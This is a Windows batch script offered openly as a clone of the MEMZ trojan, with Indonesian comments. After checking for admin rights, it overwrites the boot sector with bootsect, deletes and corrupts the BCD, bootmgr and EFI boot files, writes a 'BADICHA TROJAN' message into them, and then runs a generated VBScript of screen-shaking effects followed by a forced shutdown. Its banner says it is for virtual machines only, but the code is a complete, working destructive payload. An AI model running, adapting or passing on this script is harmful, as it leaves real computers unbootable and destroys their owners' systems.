@echo off
title Crazyware - MEMZ Clone (NO RAW DISK ACCESS)
color 0c
mode con cols=75 lines=20

echo ==================================================
echo ⚠️  WARNING: ACTS LIKE ORIGINAL MEMZ TROJAN
echo ==================================================
echo Damages boot code, BCD, and system boot files.
echo Windows WILL NOT boot normally.
echo Basic repair commands WILL NOT fix it easily.
echo USE ONLY ON VIRTUAL MACHINES / TEST DEVICES!
echo ==================================================
echo Press any key to continue...
pause >nul

:: Cek hak admin
net session >nul 2>&1 || (echo ❌ Run as ADMINISTRATOR! & pause & exit /b)

:: ==============================================
:: BAGIAN 1: RUSAK BOOT TANPA \\.\PhysicalDrive0
:: ==============================================
echo [1/2] Destroying boot configuration...

:: Cadangkan dulu sejenak (hapus nanti)
bcdedit /export "C:\TEMP_BCD_BAK" >nul 2>&1

:: 1. Timpa kode boot utama (setara timpa MBR)
bootsect /nt52 SYS /force >nul 2>&1
bootsect /mbr 0 >nul 2>&1

:: 2. Hancurkan total BCD (konfigurasi boot)
del /f /q "%SystemDrive%\Boot\BCD" >nul 2>&1
del /f /q "%SystemDrive%\EFI\Microsoft\Boot\BCD" >nul 2>&1

:: 3. Timpa BCD dengan data kosong + tanda valid
echo YOUR PC HAS BEEN TRASHED BY BADICHA TROJAN > "%SystemDrive%\Boot\BCD"
echo YOUR PC HAS BEEN TRASHED BY BADICHA TROJAN > "%SystemDrive%\EFI\Microsoft\Boot\BCD"

:: 4. Hapus file boot penting lainnya
del /f /q "%SystemDrive%\Boot\bootmgr" >nul 2>&1
del /f /q "%SystemDrive%\EFI\Microsoft\Boot\bootmgfw.efi" >nul 2>&1

:: 5. Pakai PowerShell untuk acak ukuran & isi file boot
powershell -Command "$path = 'C:\Boot\BCD'; $data = [byte[]]@(89,79,85,82,32,80,67,32,72,65,83,32,66,69,69,78,32,84,82,65,83,72,69,68,32,66,89,32,66,65,68,73,67,72,65,32,84,82,79,74,65,78) + [byte[]]::CreateInstance([byte], 470) + [byte[]]@(85,170); [System.IO.File]::WriteAllBytes($path, $data)" >nul 2>&1

:: ==============================================
:: BAGIAN 2: EFEK LAYAR + JEBAKAN SHUTDOWN
:: ==============================================
echo [2/2] Running MEMZ-style screen effects...
(
echo Set WshShell = CreateObject("WScript.Shell")
echo Sub OnQuit : WshShell.Run "shutdown /s /f /t 1", 0, False : End Sub
echo Set html = CreateObject("HTMLFile")
echo w = html.parentWindow.screen.width : h = html.parentWindow.screen.height
echo.
echo For i = 1 To 320
echo     If i < 90 Then
echo         WScript.Sleep 50 : WshShell.SendKeys "{SCROLLLOCK}"
echo     ElseIf i < 240 Then
echo         For sz = 0 To 180 Step 25
echo             WshShell.Run "mshta ""<script>resizeTo(" & w-sz*2 & "," & h-sz*2 & ");moveTo(" & sz & "," & sz & ");</script>""", 0, True
echo             WScript.Sleep 15
echo         Next
echo     Else
echo         WshShell.Run "mshta ""<script>moveBy(0,12);</script>""", 0, True
echo         WScript.Sleep 40
echo     End If
echo Next
echo.
echo Set WshShell = Nothing
) > effects.vbs

cscript //nologo effects.vbs
del effects.vbs >nul
exit /b